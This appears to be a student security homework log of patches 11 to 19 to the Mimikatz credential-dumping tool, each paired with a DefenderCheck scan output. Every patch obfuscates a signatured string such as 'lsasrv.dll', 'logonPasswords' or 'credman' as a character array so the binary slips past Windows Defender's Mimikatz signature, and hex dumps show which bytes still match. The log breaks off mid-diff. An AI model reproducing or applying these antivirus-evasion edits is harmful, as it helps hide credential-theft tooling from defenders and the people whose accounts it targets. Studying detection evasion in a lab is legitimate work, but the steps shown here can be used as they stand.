00000020   74 00 53 00 65 00 74 00  4B 00 65 00 79 00 50 00   t�S�e�t�K�e�y�P�
00000030   61 00 72 00 61 00 6D 00  20 00 28 00 30 00 78 00   a�r�a�m� �(�0�x�
00000040   25 00 30 00 38 00 78 00  29 00 0A 00 00 00 00 00   %�0�8�x�)�������
00000050   00 00 00 00 45 00 52 00  52 00 4F 00 52 00 20 00   ����E�R�R�O�R� �
00000060   6B 00 75 00 68 00 6C 00  5F 00 6D 00 5F 00 6C 00   k�u�h�l�_�m�_�l�
00000070   73 00 61 00 64 00 75 00  6D 00 70 00 5F 00 73 00   s�a�d�u�m�p�_�s�
00000080   65 00 63 00 5F 00 61 00  65 00 73 00 32 00 35 00   e�c�_�a�e�s�2�5�
00000090   36 00 20 00 3B 00 20 00  6B 00 75 00 6C 00 6C 00   6� �;� �k�u�l�l�
000000A0   5F 00 6D 00 5F 00 63 00  72 00 79 00 70 00 74 00   _�m�_�c�r�y�p�t�
000000B0   6F 00 5F 00 68 00 6B 00  65 00 79 00 20 00 28 00   o�_�h�k�e�y� �(�
000000C0   30 00 78 00 25 00 30 00  38 00 78 00 29 00 0A 00   0�x�%�0�8�x�)���
000000D0   00 00 00 00 73 00 61 00  6D 00 73 00 72 00 76 00   ����s�a�m�s�r�v�
000000E0   2E 00 64 00 6C 00 6C 00  00 00 00 00 6C 00 73 00   .�d�l�l�����l�s�
000000F0   61 00 73 00 72 00 76 00  2E 00 64 00 6C 00 6C 00   a�s�r�v�.�d�l�l�
```


## 11.patch
### 11.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 74aa930..47e2c8e 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -1288,7 +1288,8 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
 };
 #endif
-PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = L"lsasrv.dll", szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll", szAdvapi32 = L"advapi32.dll";
+wchar_t lsas[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = lsas, szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll", szAdvapi32 = L"advapi32.dll";
 NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL, enumStatus;
```
### 11.2: test.bat
```C:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x120464 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   25 00 73 00 20 00 3A 00  20 00 00 00 20 00 20 00   %�s� �:� ��� � �
00000010   20 00 20 00 20 00 20 00  25 00 73 00 20 00 28 00    � � � �%�s� �(�
00000020   25 00 75 00 29 00 20 00  3A 00 20 00 00 00 00 00   %�u�)� �:� �����
00000030   00 00 00 00 4E 00 4F 00  4E 00 45 00 20 00 20 00   ����N�O�N�E� � �
00000040   20 00 00 00 4E 00 54 00  34 00 4F 00 57 00 46 00    ���N�T�4�O�W�F�
00000050   20 00 00 00 43 00 4C 00  45 00 41 00 52 00 20 00    ���C�L�E�A�R� �
00000060   20 00 00 00 56 00 45 00  52 00 53 00 49 00 4F 00    ���V�E�R�S�I�O�
00000070   4E 00 00 00 20 00 5B 00  25 00 73 00 5D 00 20 00   N��� �[�%�s�]� �
00000080   25 00 77 00 5A 00 20 00  2D 00 3E 00 20 00 25 00   %�w�Z� �-�>� �%�
00000090   77 00 5A 00 0A 00 00 00  00 00 00 00 20 00 20 00   w�Z��������� � �
000000A0   20 00 20 00 2A 00 20 00  00 00 00 00 75 00 6E 00    � �*� �����u�n�
000000B0   6B 00 6E 00 6F 00 77 00  6E 00 3F 00 00 00 00 00   k�n�o�w�n�?�����
000000C0   00 00 00 00 20 00 2D 00  20 00 25 00 73 00 20 00   ���� �-� �%�s� �
000000D0   2D 00 20 00 00 00 00 00  00 00 00 00 2D 00 20 00   -� ���������-� �
000000E0   25 00 75 00 20 00 2D 00  20 00 00 00 6C 00 73 00   %�u� �-� ���l�s�
000000F0   61 00 73 00 72 00 76 00  2E 00 64 00 6C 00 6C 00   a�s�r�v�.�d�l�l�
```


## 12.patch
### 12.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 47e2c8e..5dcc8b3 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -1738,7 +1738,8 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 
 			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
 			{
-				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				wchar_t lsas[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? lsas : L"lsadb.dll", &iModule))
 				{
 					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
 					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
```
### 12.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x12DAD5 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 00 00 45 00 6E 00 64  00 20 00 21 00 0A 00 00   ���E�n�d� �!����
00000010   00 00 00 6D 00 6B 00 2E  00 6C 00 6F 00 67 00 00   ���m�k�.�l�o�g��
00000020   00 00 00 55 00 73 00 69  00 6E 00 67 00 20 00 27   ���U�s�i�n�g� �'
00000030   00 25 00 73 00 27 00 20  00 66 00 6F 00 72 00 20   �%�s�'� �f�o�r� 
00000040   00 6C 00 6F 00 67 00 66  00 69 00 6C 00 65 00 20   �l�o�g�f�i�l�e� 
00000050   00 3A 00 20 00 25 00 73  00 0A 00 00 00 00 00 00   �:� �%�s��������
00000060   00 00 00 00 00 00 00 00  00 00 00 69 00 73 00 42   �����������i�s�B
00000070   00 61 00 73 00 65 00 36  00 34 00 49 00 6E 00 74   �a�s�e�6�4�I�n�t
00000080   00 65 00 72 00 63 00 65  00 70 00 74 00 49 00 6E   �e�r�c�e�p�t�I�n
00000090   00 70 00 75 00 74 00 20  00 20 00 69 00 73 00 20   �p�u�t� � �i�s� 
000000A0   00 25 00 73 00 0A 00 69  00 73 00 42 00 61 00 73   �%�s���i�s�B�a�s
000000B0   00 65 00 36 00 34 00 49  00 6E 00 74 00 65 00 72   �e�6�4�I�n�t�e�r
000000C0   00 63 00 65 00 70 00 74  00 4F 00 75 00 74 00 70   �c�e�p�t�O�u�t�p
000000D0   00 75 00 74 00 20 00 69  00 73 00 20 00 25 00 73   �u�t� �i�s� �%�s
000000E0   00 0A 00 00 00 00 00 00  00 00 00 6C 00 73 00 61   �����������l�s�a
000000F0   00 73 00 72 00 76 00 2E  00 64 00 6C 00 6C 00 00   �s�r�v�.�d�l�l��
```


## 13.patch
### 13.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
index 18085ac..290e9fa 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_standard.c
@@ -88,8 +88,9 @@ NTSTATUS kuhl_m_standard_base64(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 const wchar_t wdg[] = { L'w', L'd', L'i', L'g', L'e', L's', L't', L'.', L'd', L'l', L'l', 0x0 };
+wchar_t slsasrv_dll[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
 const wchar_t *version_libs[] = {
-	L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", wdg, L"kerberos.dll", L"livessp.dll", L"dpapisrv.dll",
+	slsasrv_dll, L"msv1_0.dll", L"tspkg.dll", wdg, L"kerberos.dll", L"livessp.dll", L"dpapisrv.dll",
 	L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll", L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll",
 	L"eventlog.dll", L"wevtsvc.dll", L"termsrv.dll",
 };
```
### 13.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x12F570 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   65 00 67 00 65 00 4E 00  61 00 6D 00 65 00 20 00   e�g�e�N�a�m�e� �
00000010   28 00 30 00 78 00 25 00  30 00 38 00 78 00 29 00   (�0�x�%�0�8�x�)�
00000020   0A 00 00 00 00 00 00 00  25 00 75 00 09 00 00 00   ��������%�u�����
00000030   20 00 2D 00 3E 00 20 00  49 00 6D 00 70 00 65 00    �-�>� �I�m�p�e�
00000040   72 00 73 00 6F 00 6E 00  61 00 74 00 65 00 64 00   r�s�o�n�a�t�e�d�
00000050   20 00 21 00 0A 00 00 00  00 00 00 00 00 00 00 00    �!�������������
00000060   45 00 52 00 52 00 4F 00  52 00 20 00 6B 00 75 00   E�R�R�O�R� �k�u�
00000070   68 00 6C 00 5F 00 6D 00  5F 00 74 00 6F 00 6B 00   h�l�_�m�_�t�o�k�
00000080   65 00 6E 00 5F 00 6C 00  69 00 73 00 74 00 5F 00   e�n�_�l�i�s�t�_�
00000090   6F 00 72 00 5F 00 65 00  6C 00 65 00 76 00 61 00   o�r�_�e�l�e�v�a�
000000A0   74 00 65 00 5F 00 63 00  61 00 6C 00 6C 00 62 00   t�e�_�c�a�l�l�b�
000000B0   61 00 63 00 6B 00 20 00  3B 00 20 00 53 00 65 00   a�c�k� �;� �S�e�
000000C0   74 00 54 00 68 00 72 00  65 00 61 00 64 00 54 00   t�T�h�r�e�a�d�T�
000000D0   6F 00 6B 00 65 00 6E 00  20 00 28 00 30 00 78 00   o�k�e�n� �(�0�x�
000000E0   25 00 30 00 38 00 78 00  29 00 0A 00 00 00 00 00   %�0�8�x�)�������
000000F0   6D 00 75 00 6C 00 74 00  69 00 72 00 64 00 70 00   m�u�l�t�i�r�d�p�
```


## 14.patch
### 14.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_ts.c b/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
index b65799d..0c48bf6 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_ts.c
@@ -5,8 +5,9 @@
 */
 #include "kuhl_m_ts.h"
 
+wchar_t smultirdp[] = { L'm', L'u', L'l', L't', L'i', L'r', L'd', L'p', 0x0 };
 const KUHL_M_C kuhl_m_c_ts[] = {
-	{kuhl_m_ts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
+	{kuhl_m_ts_multirdp,	smultirdp,	L"[experimental] patch Terminal Server service to allow multiples users"},
 	{kuhl_m_ts_sessions,	L"sessions",	NULL},
 	{kuhl_m_ts_remote,		L"remote",		NULL},
 };
```
### 14.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x130C3D in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 5D 00 20 00 25 00 73  00 00 00 5B 00 42 00 59   �]� �%�s���[�B�Y
00000010   00 54 00 45 00 2A 00 5D  00 20 00 00 00 00 00 00   �T�E�*�]� ������
00000020   00 00 00 5B 00 53 00 49  00 44 00 5D 00 20 00 00   ���[�S�I�D�]� ��
00000030   00 00 00 5B 00 41 00 54  00 54 00 52 00 49 00 42   ���[�A�T�T�R�I�B
00000040   00 55 00 54 00 45 00 5D  00 0A 00 00 00 00 00 00   �U�T�E�]��������
00000050   00 00 00 09 00 09 00 20  00 20 00 46 00 6C 00 61   ������� � �F�l�a
00000060   00 67 00 73 00 20 00 20  00 20 00 3A 00 20 00 25   �g�s� � � �:� �%
00000070   00 30 00 38 00 78 00 20  00 2D 00 20 00 25 00 75   �0�8�x� �-� �%�u
00000080   00 0A 00 00 00 00 00 00  00 00 00 09 00 09 00 20   ��������������� 
00000090   00 20 00 4B 00 65 00 79  00 77 00 6F 00 72 00 64   � �K�e�y�w�o�r�d
000000A0   00 20 00 3A 00 20 00 25  00 73 00 0A 00 00 00 00   � �:� �%�s������
000000B0   00 00 00 09 00 09 00 20  00 20 00 56 00 61 00 6C   ������� � �V�a�l
000000C0   00 75 00 65 00 20 00 20  00 20 00 3A 00 20 00 00   �u�e� � � �:� ��
000000D0   00 00 00 5B 00 54 00 79  00 70 00 65 00 20 00 25   ���[�T�y�p�e� �%
000000E0   00 32 00 75 00 5D 00 20  00 00 00 6C 00 73 00 61   �2�u�]� ���l�s�a
000000F0   00 73 00 72 00 76 00 2E  00 64 00 6C 00 6C 00 00   �s�r�v�.�d�l�l��
```


## 15.patch
### 15.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_vault.c b/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
index b0d6079..70c4b21 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_vault.c
@@ -469,7 +469,8 @@ NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
 				{
 					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
 					{
-						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &iModuleSamSrv))
+						wchar_t lsas2[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, lsas2, &iModuleSamSrv))
 						{
 							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
 							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
```
### 15.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x138904 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   67 00 20 00 63 00 72 00  65 00 64 00 65 00 6E 00   g� �c�r�e�d�e�n�
00000010   74 00 69 00 61 00 6C 00  73 00 00 00 6C 00 69 00   t�i�a�l�s���l�i�
00000020   76 00 65 00 73 00 73 00  70 00 00 00 4C 00 69 00   v�e�s�s�p���L�i�
00000030   73 00 74 00 73 00 20 00  4C 00 69 00 76 00 65 00   s�t�s� �L�i�v�e�
00000040   53 00 53 00 50 00 20 00  63 00 72 00 65 00 64 00   S�S�P� �c�r�e�d�
00000050   65 00 6E 00 74 00 69 00  61 00 6C 00 73 00 00 00   e�n�t�i�a�l�s���
00000060   00 00 00 00 63 00 6C 00  6F 00 75 00 64 00 61 00   ����c�l�o�u�d�a�
00000070   70 00 00 00 4C 00 69 00  73 00 74 00 73 00 20 00   p���L�i�s�t�s� �
00000080   43 00 6C 00 6F 00 75 00  64 00 41 00 70 00 20 00   C�l�o�u�d�A�p� �
00000090   63 00 72 00 65 00 64 00  65 00 6E 00 74 00 69 00   c�r�e�d�e�n�t�i�
000000A0   61 00 6C 00 73 00 00 00  00 00 00 00 73 00 73 00   a�l�s�������s�s�
000000B0   70 00 00 00 4C 00 69 00  73 00 74 00 73 00 20 00   p���L�i�s�t�s� �
000000C0   53 00 53 00 50 00 20 00  63 00 72 00 65 00 64 00   S�S�P� �c�r�e�d�
000000D0   65 00 6E 00 74 00 69 00  61 00 6C 00 73 00 00 00   e�n�t�i�a�l�s���
000000E0   00 00 00 00 6C 00 6F 00  67 00 6F 00 6E 00 50 00   ����l�o�g�o�n�P�
000000F0   61 00 73 00 73 00 77 00  6F 00 72 00 64 00 73 00   a�s�s�w�o�r�d�s�
```


## 16.patch
### 16.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
index 7393447..23f226d 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
@@ -5,6 +5,7 @@
 */
 #include "kuhl_m_sekurlsa.h"
 
+wchar_t slogonPasswords[] = { L'l', L'o', L'g', L'o', L'n', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L's', 0x0 };
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
 	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
@@ -15,7 +16,8 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 #endif
 	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
 	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
-	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_all,				slogonPasswords,	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_all,				slogonPasswords,	L"Lists all available providers credentials"},
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
```
### 16.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x138C9F in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 64 00 20 00 42 00 61  00 63 00 6B 00 75 00 70   �d� �B�a�c�k�u�p
00000010   00 20 00 4D 00 61 00 73  00 74 00 65 00 72 00 20   � �M�a�s�t�e�r� 
00000020   00 6B 00 65 00 79 00 73  00 00 00 00 00 00 00 00   �k�e�y�s��������
00000030   00 74 00 69 00 63 00 6B  00 65 00 74 00 73 00 00   �t�i�c�k�e�t�s��
00000040   00 4C 00 69 00 73 00 74  00 20 00 4B 00 65 00 72   �L�i�s�t� �K�e�r
00000050   00 62 00 65 00 72 00 6F  00 73 00 20 00 74 00 69   �b�e�r�o�s� �t�i
00000060   00 63 00 6B 00 65 00 74  00 73 00 00 00 00 00 00   �c�k�e�t�s������
00000070   00 65 00 6B 00 65 00 79  00 73 00 00 00 00 00 00   �e�k�e�y�s������
00000080   00 4C 00 69 00 73 00 74  00 20 00 4B 00 65 00 72   �L�i�s�t� �K�e�r
00000090   00 62 00 65 00 72 00 6F  00 73 00 20 00 45 00 6E   �b�e�r�o�s� �E�n
000000A0   00 63 00 72 00 79 00 70  00 74 00 69 00 6F 00 6E   �c�r�y�p�t�i�o�n
000000B0   00 20 00 4B 00 65 00 79  00 73 00 00 00 00 00 00   � �K�e�y�s������
000000C0   00 4C 00 69 00 73 00 74  00 20 00 43 00 61 00 63   �L�i�s�t� �C�a�c
000000D0   00 68 00 65 00 64 00 20  00 4D 00 61 00 73 00 74   �h�e�d� �M�a�s�t
000000E0   00 65 00 72 00 4B 00 65  00 79 00 73 00 00 00 00   �e�r�K�e�y�s����
000000F0   00 63 00 72 00 65 00 64  00 6D 00 61 00 6E 00 00   �c�r�e�d�m�a�n��
```


## 17.patch
### 17.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
index 23f226d..74221d0 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
@@ -6,6 +6,7 @@
 #include "kuhl_m_sekurlsa.h"
 
 wchar_t slogonPasswords[] = { L'l', L'o', L'g', L'o', L'n', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L's', 0x0 };
+wchar_t scredman[] = { L'c', L'r', L'e', L'd', L'm', L'a', L'n', 0x0 };
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
 	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
@@ -17,7 +18,6 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
 	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
 	{kuhl_m_sekurlsa_all,				slogonPasswords,	L"Lists all available providers credentials"},
-	{kuhl_m_sekurlsa_all,				slogonPasswords,	L"Lists all available providers credentials"},
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
@@ -34,7 +34,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
-	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
+	{kuhl_m_sekurlsa_credman,			scredman,			L"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
```
### 17.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x13B926 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   3B 00 20 00 53 00 6B 00  70 00 45 00 6E 00 63 00   ;� �S�k�p�E�n�c�
00000010   72 00 79 00 70 00 74 00  69 00 6F 00 6E 00 57 00   r�y�p�t�i�o�n�W�
00000020   6F 00 72 00 6B 00 65 00  72 00 28 00 64 00 65 00   o�r�k�e�r�(�d�e�
00000030   63 00 72 00 79 00 70 00  74 00 29 00 3A 00 20 00   c�r�y�p�t�)�:� �
00000040   30 00 78 00 25 00 30 00  38 00 78 00 20 00 2D 00   0�x�%�0�8�x� �-�
00000050   2D 00 20 00 69 00 6E 00  76 00 61 00 6C 00 69 00   -� �i�n�v�a�l�i�
00000060   64 00 61 00 74 00 69 00  6E 00 67 00 20 00 74 00   d�a�t�i�n�g� �t�
00000070   68 00 65 00 20 00 6B 00  65 00 79 00 0A 00 00 00   h�e� �k�e�y�����
00000080   00 00 63 00 6C 00 6F 00  75 00 64 00 61 00 70 00   ��c�l�o�u�d�a�p�
00000090   2E 00 64 00 6C 00 6C 00  00 00 0A 00 09 00 20 00   .�d�l�l������� �
000000A0   20 00 20 00 20 00 20 00  43 00 61 00 63 00 68 00    � � � �C�a�c�h�
000000B0   65 00 64 00 69 00 72 00  20 00 3A 00 20 00 25 00   e�d�i�r� �:� �%�
000000C0   73 00 00 00 00 00 00 00  00 00 0A 00 09 00 20 00   s������������� �
000000D0   20 00 20 00 20 00 20 00  4B 00 65 00 79 00 20 00    � � � �K�e�y� �
000000E0   47 00 55 00 49 00 44 00  20 00 3A 00 20 00 00 00   G�U�I�D� �:� ���
000000F0   00 00 63 00 72 00 65 00  64 00 6D 00 61 00 6E 00   ��c�r�e�d�m�a�n�
```


## 18.patch
### 18.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
index e7fd827..ac0a7bf 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
@@ -5,7 +5,8 @@
 */
 #include "kuhl_m_sekurlsa_credman.h"
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {L"credman", kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+wchar_t sc[] = { L'c', L'r', L'e', L'd', L'm', L'a', L'n', 0x0 };
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {sc, kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_single_package[] = {&kuhl_m_sekurlsa_credman_package};
 
 NTSTATUS kuhl_m_sekurlsa_credman(int argc, wchar_t * argv[])
```
### 18.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x13B92C in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   6B 00 70 00 45 00 6E 00  63 00 72 00 79 00 70 00   k�p�E�n�c�r�y�p�
00000010   74 00 69 00 6F 00 6E 00  57 00 6F 00 72 00 6B 00   t�i�o�n�W�o�r�k�
00000020   65 00 72 00 28 00 64 00  65 00 63 00 72 00 79 00   e�r�(�d�e�c�r�y�
00000030   70 00 74 00 29 00 3A 00  20 00 30 00 78 00 25 00   p�t�)�:� �0�x�%�
00000040   30 00 38 00 78 00 20 00  2D 00 2D 00 20 00 69 00   0�8�x� �-�-� �i�
00000050   6E 00 76 00 61 00 6C 00  69 00 64 00 61 00 74 00   n�v�a�l�i�d�a�t�
00000060   69 00 6E 00 67 00 20 00  74 00 68 00 65 00 20 00   i�n�g� �t�h�e� �
00000070   6B 00 65 00 79 00 0A 00  00 00 00 00 63 00 6C 00   k�e�y�������c�l�
00000080   6F 00 75 00 64 00 61 00  70 00 2E 00 64 00 6C 00   o�u�d�a�p�.�d�l�
00000090   6C 00 00 00 0A 00 09 00  20 00 20 00 20 00 20 00   l������� � � � �
000000A0   20 00 43 00 61 00 63 00  68 00 65 00 64 00 69 00    �C�a�c�h�e�d�i�
000000B0   72 00 20 00 3A 00 20 00  25 00 73 00 00 00 00 00   r� �:� �%�s�����
000000C0   00 00 00 00 0A 00 09 00  20 00 20 00 20 00 20 00   �������� � � � �
000000D0   20 00 4B 00 65 00 79 00  20 00 47 00 55 00 49 00    �K�e�y� �G�U�I�
000000E0   44 00 20 00 3A 00 20 00  00 00 00 00 6C 00 73 00   D� �:� �����l�s�
000000F0   61 00 73 00 72 00 76 00  2E 00 64 00 6C 00 6C 00   a�s�r�v�.�d�l�l�
```


## 19.patch
### 19.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
index 09eb7b8..1c5234c 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c
@@ -6,7 +6,8 @@
 #include "kuhl_m_sekurlsa_credman.h"
 
 wchar_t sc[] = { L'c', L'r', L'e', L'd', L'm', L'a', L'n', 0x0 };
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {sc, kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+wchar_t lsas_again[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package = {sc, kuhl_m_sekurlsa_enum_logon_callback_credman, TRUE, lsas_again, {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_single_package[] = {&kuhl_m_sekurlsa_credman_package};
 
